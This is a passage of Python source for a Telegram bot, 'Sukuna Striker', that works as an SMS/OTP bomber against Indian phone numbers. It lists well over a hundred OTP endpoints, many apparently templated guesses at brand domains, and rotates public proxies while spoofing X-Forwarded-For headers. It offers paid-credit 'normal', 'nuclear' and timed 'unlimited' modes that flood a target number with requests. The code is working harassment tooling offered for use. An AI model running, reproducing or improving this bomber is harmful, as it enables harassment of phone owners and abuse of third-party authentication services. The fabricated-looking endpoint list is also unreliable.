    ("Unread News App","POST","https://api.news.unreadapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lire News App","POST","https://api.news.lireapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ReadKit News App","POST","https://api.news.readkitapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vienna News App","POST","https://api.news.viennaapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSOwl News App","POST","https://api.news.rssowlapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("QuiteRSS News App","POST","https://api.news.quiterssapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Liferea News App","POST","https://api.news.lifereaapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FeedReader News App","POST","https://api.news.feedreaderapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSBandit News App","POST","https://api.news.rssbanditapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSGuard News App","POST","https://api.news.rssguardapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FluentReader News App","POST","https://api.news.fluentreaderapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GoodLinks News App","POST","https://api.news.goodlinksapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Curtail News App","POST","https://api.news.curtailapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wallabag News App","POST","https://api.news.wallabagapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Shiori News App","POST","https://api.news.shioriapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkAce News App","POST","https://api.news.linkaceapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Raindrop News App","POST","https://api.news.raindropapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BookmarkOS News App","POST","https://api.news.bookmarkosapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StartMe News App","POST","https://api.news.startmeapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Papaly News App","POST","https://api.news.papalyapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Booky News App","POST","https://api.news.bookyapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Diigo News App","POST","https://api.news.diigoapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Delicious News App","POST","https://api.news.deliciousapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pinboard News App","POST","https://api.news.pinboardapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ScoopIt News App","POST","https://api.news.scoopitapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paperli News App","POST","https://api.news.paperliapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flipboard News App","POST","https://api.news.flipboardapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SmartNews News App","POST","https://api.news.smartnewsapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Opera News","POST","https://api.news.opera.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Brave News","POST","https://api.news.brave.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vivaldi News","POST","https://api.news.vivaldi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Firefox News","POST","https://api.news.firefox.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Chrome News","POST","https://api.news.chrome.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Edge News","POST","https://api.news.edge.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Safari News","POST","https://api.news.safari.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("DuckDuckGo News","POST","https://api.news.duckduckgo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ecosia News","POST","https://api.news.ecosia.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Qwant News","POST","https://api.news.qwant.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Startpage News","POST","https://api.news.startpage.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Search News","POST","https://api.news.search.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yandex News","POST","https://api.news.yandex.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bing News","POST","https://api.news.bing.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yahoo News Search","POST","https://api.news.yahoosearch.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ask News","POST","https://api.news.ask.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AOL News Search","POST","https://api.news.aolsearch.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wolfram News","POST","https://api.news.wolfram.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Perplexity News","POST","https://api.news.perplexity.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Claude News","POST","https://api.news.claude.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gemini News","POST","https://api.news.gemini.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ChatGPT News","POST","https://api.news.chatgpt.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("DeepSeek News","POST","https://api.news.deepseek.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Copilot News","POST","https://api.news.copilot.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Grammarly News","POST","https://api.news.grammarly.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hemingway News","POST","https://api.news.hemingway.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ProWritingAid News","POST","https://api.news.prowritingaid.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Quillbot News","POST","https://api.news.quillbot.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Jasper News","POST","https://api.news.jasper.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Copy.ai News","POST","https://api.news.copy.ai/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Writesonic News","POST","https://api.news.writesonic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Rytr News","POST","https://api.news.rytr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Anyword News","POST","https://api.news.anyword.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Peppertype News","POST","https://api.news.peppertype.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Frase News","POST","https://api.news.frase.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SurferSEO News","POST","https://api.news.surferseo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MarketMuse News","POST","https://api.news.marketmuse.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Clearscope News","POST","https://api.news.clearscope.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SEMrush News","POST","https://api.news.semrush.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ahrefs News","POST","https://api.news.ahrefs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Moz News","POST","https://api.news.moz.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SpyFu News","POST","https://api.news.spyfu.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SimilarWeb News","POST","https://api.news.similarweb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Alexa News","POST","https://api.news.alexa.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Compete News","POST","https://api.news.compete.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Quantcast News","POST","https://api.news.quantcast.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Comscore News","POST","https://api.news.comscore.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Nielsen News","POST","https://api.news.nielsen.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IRI News","POST","https://api.news.iri.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NPD News","POST","https://api.news.npd.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gartner News","POST","https://api.news.gartner.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Forrester News","POST","https://api.news.forrester.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IDC News","POST","https://api.news.idc.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Accenture News","POST","https://api.news.accenture.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Deloitte News","POST","https://api.news.deloitte.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PwC News","POST","https://api.news.pwc.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EY News","POST","https://api.news.ey.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("KPMG News","POST","https://api.news.kpmg.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("McKinsey News","POST","https://api.news.mckinsey.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BCG News","POST","https://api.news.bcg.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bain News","POST","https://api.news.bain.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OliverWyman News","POST","https://api.news.oliverwyman.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LEK News","POST","https://api.news.lek.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kearney News","POST","https://api.news.kearney.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Strategy& News","POST","https://api.news.strategyand.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RolandBerger News","POST","https://api.news.rolandberger.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ArthurDLittle News","POST","https://api.news.adlittle.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AlixPartners News","POST","https://api.news.alixpartners.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FTI News","POST","https://api.news.fti.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Navigant News","POST","https://api.news.navigant.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PA Consulting News","POST","https://api.news.paconsulting.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BearingPoint News","POST","https://api.news.bearingpoint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Capgemini News","POST","https://api.news.capgemini.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Atos News","POST","https://api.news.atos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cognizant News","POST","https://api.news.cognizant.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Infosys News","POST","https://api.news.infosys.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TCS News","POST","https://api.news.tcs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wipro News","POST","https://api.news.wipro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HCL News","POST","https://api.news.hcl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tech Mahindra News","POST","https://api.news.techmahindra.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LTI News","POST","https://api.news.lti.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mphasis News","POST","https://api.news.mphasis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
]

# ─── BUILD MERGED LIST (dedup by host+path) ───────────────────────
def _norm_key(method, url):
    try:
        u = urlparse(url)
        return f"{method.upper()}:{u.netloc.lower()}{u.path.rstrip('/')}"
    except Exception:
        return f"{method.upper()}:{url}"

ALL_APIS = []
_seen = set()

for a in INDIA_SMS_APIS:
    raw = a["url"] if isinstance(a["url"], str) else a["url"]("0000000000")
    k = _norm_key(a["method"], raw)
    if k in _seen: continue
    _seen.add(k)
    ALL_APIS.append(a)

for name, method, url, body in _BULK_SPEC:
    k = _norm_key(method, url)
    if k in _seen: continue
    _seen.add(k)
    ALL_APIS.append({
        "name": name, "url": url, "method": method,
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "data": (lambda p, t=body: t.replace("{p}", p)) if body else None
    })

# ═══════════════════════════════════════════════════════════════════
#  PROXIES + DB + UTILS + HANDLERS  (unchanged core, cleaner UI)
# ═══════════════════════════════════════════════════════════════════
PROXY_LIST = [
    "1.0.136.129:8080","1.0.170.50:8080","1.1.109.141:9999","1.1.189.58:8080",
    "1.1.220.100:8080","1.10.141.115:8080","1.10.146.76:3128","1.117.83.95:80",
    "1.179.147.5:52210","1.179.148.33:1080","1.179.148.9:36476","1.179.148.9:55636",
    "1.179.172.45:31225","1.179.199.130:33333","1.179.231.130:8080","1.180.0.162:7302",
    "1.180.49.222:7302","1.2.252.65:8080","1.20.169.102:8080","1.212.157.114:4145",
    "1.234.153.14:80","1.4.198.167:8080","1.52.198.150:16000","1.52.198.221:16000",
    "1.54.172.229:16000","1.9.167.35:60489","100.1.53.24:5678","100.27.183.62:8080",
    "101.108.112.243:8080","101.108.113.83:8080","101.109.107.206:8080","101.109.119.24:8080",
    "101.109.217.20:8080","101.109.245.200:4153","101.109.76.109:4145","101.128.107.36:1111",
    "101.128.93.144:8090","101.2.161.118:8080","101.200.241.24:3128","101.251.204.174:8080",
    "101.255.106.94:8080","101.255.107.118:8080","101.255.119.206:8080","101.255.119.26:8080",
    "101.255.137.49:80","101.255.138.82:80","101.255.148.2:8080","101.255.150.238:1080",
    "101.255.158.78:1111","101.255.166.134:1111","101.255.208.18:8090","101.255.208.62:8080",
    "101.255.210.1:1111","101.255.210.1:11116","101.255.211.42:1111","101.255.211.54:8082",
    "101.255.32.42:8080","101.255.53.105:8080","101.255.69.26:8080","101.32.34.4:8118",
    "101.47.16.15:7890","101.51.121.29:4153","101.51.138.138:8080","101.91.242.198:6688",
]
_proxy_idx, _proxy_lock, _dead_proxies = 0, threading.Lock(), set()

def get_proxy():
    global _proxy_idx
    if not PROXY_LIST: return None
    with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
            _proxy_idx += 1; tried += 1
            if p not in _dead_proxies:
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

DB_DIR = "db"; os.makedirs(DB_DIR, exist_ok=True)

def load_db(name, default):
    path = f"{DB_DIR}/{name}.json"
    if not os.path.exists(path):
        with open(path, "w") as f: json.dump(default, f)
    with open(path) as f: return json.load(f)

def save_db(name, data):
    with open(f"{DB_DIR}/{name}.json", "w") as f: json.dump(data, f, indent=2)

users   = load_db("users", {});   credits = load_db("credits", {})
attack_logs = load_db("attack_logs", {}); banned_users = load_db("banned", [])

def is_owner(uid): return int(uid) == OWNER_ID
def is_admin(uid): return int(uid) in ADMIN_IDS
def is_banned(uid): return str(uid) in banned_users if not is_admin(uid) else False
def get_user_credits(uid): return 999999 if is_owner(uid) else credits.get(str(uid), 0)
def deduct_credit(uid, amt=10):
    if is_owner(uid): return True
    s = str(uid); cur = get_user_credits(s)
    if cur >= amt:
        credits[s] = cur - amt; save_db("credits", credits); return True
    return False
def add_footer(t): return f"{t}\n{FOOTER}" if "Sukuna Developer" not in t else t

def check_channel_join(uid):
    if is_admin(uid): return []
    miss = []
    for ch in MUST_JOIN_CHANNELS:
        if ch.get("type") == "telegram_public":
            try:
                m = bot.get_chat_member(f"@{ch['username']}", uid)
                if m.status not in ["member","administrator","creator"]: miss.append(ch)
            except Exception: pass
    return miss

def call_api_safe(api, phone):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
    }
    if api.get("headers"): headers.update(api["headers"])
    url = api["url"](phone) if callable(api["url"]) else api["url"]
    raw = api["data"](phone) if callable(api.get("data")) else (api.get("data") or "")
    def _do(px):
        m = api["method"]
        if m == "POST": return requests.post(url, data=raw, headers=headers, proxies=px, timeout=6, verify=False)
        if m == "PUT":  return requests.put(url, data=raw, headers=headers, proxies=px, timeout=6, verify=False)
        return requests.get(url, headers=headers, proxies=px, timeout=6, verify=False)
    px = get_proxy()
    if px:
        try: return _do(px).status_code in (200,201,202)
        except Exception: pass
    try: return _do(None).status_code in (200,201,202)
    except Exception: return False

# ─── KEYBOARDS ────────────────────────────────────────────────────
def main_menu_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.row("⚡ Launch Attack", "🔥 Unlimited Mode")
    kb.row("📊 System Status", "🎁 Free Credits")
    kb.row("📈 Account Stats", "ℹ️ Support")
    return kb

def join_required_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    for ch in MUST_JOIN_CHANNELS:
        kb.add(InlineKeyboardButton(f"{ch['icon']} Join {ch['name']}", url=ch["url"]))
    kb.add(InlineKeyboardButton("✅ Verify Access", callback_data="verify_channel_join"))
    return kb

def confirmation_keyboard(phone, tier, cost):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("🚀 CONFIRM", callback_data=f"exec_atk_{tier}_{phone}"),
           InlineKeyboardButton("❌ ABORT", callback_data="cancel_atk"))
    return kb

def unlimited_confirm_keyboard(phone, minutes, cost):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("🔥 START", callback_data=f"exec_unl_{minutes}_{phone}"),
           InlineKeyboardButton("❌ ABORT", callback_data="cancel_atk"))
    return kb

def tier_inline_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("💣 Normal — 100 OTPs", callback_data="tier_normal"),
           InlineKeyboardButton("⚡ Premium — 200 OTPs", callback_data="tier_premium"),
           InlineKeyboardButton(f"☢️ Nuclear — ALL {len(ALL_APIS)} APIs", callback_data="tier_nuclear"),
           InlineKeyboardButton("❌ Cancel", callback_data="tier_cancel"))
    return kb

# ─── HANDLERS ─────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
def start_command(message):
    uid = str(message.from_user.id)
    if is_banned(uid): return
    if check_channel_join(int(uid)):
        bot.send_message(message.chat.id, add_footer(
            f"🔒 <b>ACCESS LOCKED</b>\n{SEP}\n"
            f"Join both channels to unlock.\n\n"
            f"📢 https://t.me/yt15t5t\n"
            f"🎬 https://youtube.com/@sukuna_hacker-academy"),
            reply_markup=join_required_keyboard()); return
    if uid not in users:
        users[uid] = {"joined": time.time(), "total_bombs": 0, "total_sms": 0}
        credits[uid] = 50; save_db("users", users); save_db("credits", credits)
    bot.send_message(message.chat.id, add_footer(
        f"⚡ <b>SUKUNA STRIKER</b>\n{SEP}\n"
        f"👤 Operator: <code>sukuna-dev</code>\n"
        f"💰 Credits: <code>{get_user_credits(uid)}</code>\n"
        f"📡 APIs loaded: <code>{len(ALL_APIS)}</code>\n{SEP}\n"
        f"<i>Select an option below.</i>"), reply_markup=main_menu_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "verify_channel_join")
def verify_join_callback(call):
    uid = call.from_user.id
    if check_channel_join(uid):
        bot.answer_callback_query(call.id, "❌ Channels not joined!", show_alert=True); return
    bot.answer_callback_query(call.id, "✅ Access granted")
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    s = str(uid)
    if s not in users:
        users[s] = {"joined": time.time(), "total_bombs": 0, "total_sms": 0}
        credits[s] = 50; save_db("users", users); save_db("credits", credits)
    bot.send_message(call.message.chat.id, add_footer(
        f"⚡ <b>STRIKER UNLOCKED</b>\n{SEP}\nChoose a tool."), reply_markup=main_menu_keyboard())

@bot.message_handler(func=lambda m: m.text in ["⚡ Launch Attack","🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫"])
def india_sms_handler(message):
    uid = str(message.from_user.id)
    if is_banned(uid): return
    if check_channel_join(int(uid)):
        bot.send_message(message.chat.id, add_footer("🔒 /start to verify channels.")); return
    if get_user_credits(uid) < 10:
        bot.send_message(message.chat.id, add_footer("❌ Need 10 credits.")); return
    attack_logs[uid] = {"mode": "standard"}; save_db("attack_logs", attack_logs)
    bot.send_message(message.chat.id, add_footer(
        f"🎯 <b>SELECT TIER</b>\n{SEP}\n"
        f"Gateways: <code>{len(ALL_APIS)}</code>\n"
        f"Target: <code>India (+91)</code>"), reply_markup=tier_inline_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("tier_"))
def tier_callback(call):
    uid = str(call.from_user.id)
    if call.data == "tier_cancel":
        attack_logs.pop(uid, None)
        bot.edit_message_text("❌ Aborted.", call.message.chat.id, call.message.message_id); return
    tier = call.data.split("_")[1]
    attack_logs.setdefault(uid, {})["tier"] = tier; save_db("attack_logs", attack_logs)
    bot.answer_callback_query(call.id, f"Tier: {tier.upper()}")
    msg = bot.send_message(call.message.chat.id, add_footer("📱 Send 10-digit target number:"))
    bot.register_next_step_handler(msg, process_phone_number)

def process_phone_number(message):
    uid = str(message.from_user.id)
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ Exactly 10 digits.")); return
    tier = attack_logs.get(uid, {}).get("tier", "normal")
    cnt = 200 if tier == "premium" else len(ALL_APIS) if tier == "nuclear" else 100
    bot.send_message(message.chat.id, add_footer(
        f"⚠️ <b>CONFIRM</b>\n{SEP}\n"
        f"🎯 <code>+91 {phone}</code>\n"
        f"⚡ <code>{tier.upper()}</code>\n"
        f"📨 <code>~{cnt}</code>\n"
        f"💰 <code>10</code>"), reply_markup=confirmation_keyboard(phone, tier, 10))

@bot.callback_query_handler(func=lambda c: c.data.startswith(("exec_atk_","exec_unl_","cancel_atk")))
def execution_router(call):
    uid = str(call.from_user.id)
    if call.data == "cancel_atk":
        attack_logs.pop(uid, None)
        bot.edit_message_text("❌ Cancelled.", call.message.chat.id, call.message.message_id); return
    if not deduct_credit(call.from_user.id, 10):
        bot.answer_callback_query(call.id, "❌ Insufficient credits!", show_alert=True); return
    parts = call.data.split("_")
    if parts[1] == "atk":
        tier, phone = parts[2], parts[3]
        bot.edit_message_text("⚡ <b>Engaging…</b>", call.message.chat.id, call.message.message_id)
        threading.Thread(target=execute_attack,
            args=(uid, call.message.chat.id, tier, phone, f"+91 {phone}", call.message.message_id), daemon=True).start()
    elif parts[1] == "unl":
        minutes, phone = int(parts[2]), parts[3]
        bot.edit_message_text("🔥 <b>Initializing…</b>", call.message.chat.id, call.message.message_id)
        threading.Thread(target=execute_unlimited_attack,
            args=(uid, call.message.chat.id, phone, f"+91 {phone}", minutes, call.message.message_id), daemon=True).start()

def execute_attack(uid, chat_id, tier, phone, display, msg_id):
    if tier == "nuclear":   pool = ALL_APIS[:]
    elif tier == "premium": pool = random.sample(ALL_APIS, min(200, len(ALL_APIS)))
    else:                   pool = random.sample(ALL_APIS, min(100, len(ALL_APIS)))
    total = len(pool); ok = bad = 0; t0 = time.time()
    for i, api in enumerate(pool):
        if call_api_safe(api, phone): ok += 1
        else: bad += 1
        if (i+1) % 5 == 0 or i+1 == total:
            pct = int(((i+1)/total)*100)
            bar = "█"*(pct//10) + "░"*(10-pct//10)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
                    text=add_footer(
                        f"🚀 <b>STRIKING</b>\n{SEP}\n"
                        f"🎯 <code>{display}</code>\n"
                        f"📊 [{bar}] <code>{pct}%</code>\n"
                        f"✅ <code>{ok}</code>  ❌ <code>{bad}</code>\n"
                        f"📡 <code>{i+1}/{total}</code>"))
            except Exception: pass
            time.sleep(0.2)
    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
        text=add_footer(
            f"🏆 <b>COMPLETE</b>\n{SEP}\n"
            f"🎯 <code>{display}</code>\n"
            f"✅ <code>{ok}</code>\n❌ <code>{bad}</code>\n"
            f"⏱ <code>{time.time()-t0:.1f}s</code>"))

def execute_unlimited_attack(uid, chat_id, phone, display, minutes, msg_id):
    end = time.time() + minutes*60; hit = mis = 0
    while time.time() < end:
        apis = ALL_APIS[:]; random.shuffle(apis)
        for api in apis:
            if time.time() >= end: break
            if call_api_safe(api, phone): hit += 1
            else: mis += 1
            if (hit+mis) % 10 == 0:
                rem = max(0, int(end - time.time()))
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
                        text=add_footer(
                            f"🔥 <b>UNLIMITED</b>\n{SEP}\n"
                            f"🎯 <code>{display}</code>\n"
                            f"⏱ <code>{rem//60}m {rem%60}s</code>\n"
                            f"💥 <code>{hit}</code>"))
                except Exception: pass
    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
        text=add_footer(
            f"🏁 <b>EXPIRED</b>\n{SEP}\n"
            f"🎯 <code>{display}</code>\n"
            f"⚡ <code>{hit+mis}</code>\n"
            f"✅ <code>{hit}</code>"))

@bot.message_handler(func=lambda m: m.text == "🔥 Unlimited Mode")
def unlimited_mode_prompt(message):
    uid = message.from_user.id
    if check_channel_join(uid):
        bot.send_message(message.chat.id, add_footer("🔒 /start first.")); return
    msg = bot.send_message(message.chat.id, add_footer("⏱ Runtime in minutes (10–60):"))
    bot.register_next_step_handler(msg, process_unlimited_time)

def process_unlimited_time(message):
    try:
        minutes = int(message.text.strip())
        if not (10 <= minutes <= 60): raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, add_footer("❌ Enter 10–60.")); return
    msg = bot.send_message(message.chat.id, add_footer("📱 Target 10-digit number:"))
    bot.register_next_step_handler(msg, lambda m: process_unlimited_phone(m, minutes))

def process_unlimited_phone(message, minutes):
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ Invalid number.")); return
    bot.send_message(message.chat.id, add_footer(
        f"🔥 <b>CONFIRM UNLIMITED</b>\n{SEP}\n"
        f"🎯 <code>+91 {phone}</code>\n"
        f"⏱ <code>{minutes}m</code>\n"
        f"💰 <code>10</code>"), reply_markup=unlimited_confirm_keyboard(phone, minutes, 10))

@bot.message_handler(func=lambda m: m.text == "📊 System Status")
def system_status_handler(message):
    bot.send_message(message.chat.id, add_footer(
        f"📊 <b>INFRASTRUCTURE</b>\n{SEP}\n"
        f"🟢 <code>ONLINE</code>\n"
        f"📡 APIs: <code>{len(ALL_APIS)}</code>\n"
        f"🌐 Proxies: <code>{len(PROXY_LIST)}</code>"))

@bot.message_handler(func=lambda m: m.text == "🎁 Free Credits")
def free_credits_handler(message):
    bot.send_message(message.chat.id, add_footer(
        f"🎁 <b>REWARDS</b>\n{SEP}\n"
        f"📢 https://t.me/yt15t5t\n"
        f"🎬 https://youtube.com/@sukuna_hacker-academy"))

@bot.message_handler(func=lambda m: m.text == "📈 Account Stats")
def stats_handler(message):
    uid = str(message.from_user.id)
    u = users.get(uid, {})
    bot.send_message(message.chat.id, add_footer(
        f"📈 <b>ACCOUNT</b>\n{SEP}\n"
        f"🆔 <code>{uid}</code>\n"
        f"💰 <code>{get_user_credits(uid)}</code>\n"
        f"💣 <code>{u.get('total_bombs', 0)}</code>\n"
        f"📨 <code>{u.get('total_sms', 0)}</code>"))

@bot.message_handler(func=lambda m: m.text == "ℹ️ Support")
def support_handler(message):
    bot.send_message(message.chat.id, add_footer(
        f"ℹ️ <b>SUPPORT</b>\n{SEP}\n"
        f"Dev: <b>sukuna</b>\n"
        f"{DEVELOPER_USERNAME}\n"
        f"📢 https://t.me/yt15t5t"))

bot.infinity_polling(timeout=60, long_polling_timeout=60)
